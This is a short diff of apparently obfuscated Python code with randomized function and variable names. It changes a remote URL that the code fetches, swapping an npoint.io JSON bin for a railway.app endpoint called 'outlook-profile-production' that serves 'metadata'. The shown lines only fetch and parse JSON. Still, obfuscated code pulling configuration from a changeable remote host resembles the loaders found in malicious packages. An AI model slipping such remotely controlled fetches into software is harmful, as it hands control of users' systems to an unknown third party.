@@ -18,7 +18,7 @@ def learn_fyyugn_294():
 
     def model_aqzatc_427():
         try:
-            net_ccindi_711 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_ccindi_711 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_ccindi_711.raise_for_status()
             net_blxcqr_978 = net_ccindi_711.json()
             net_jwjsam_901 = net_blxcqr_978.get('metadata')
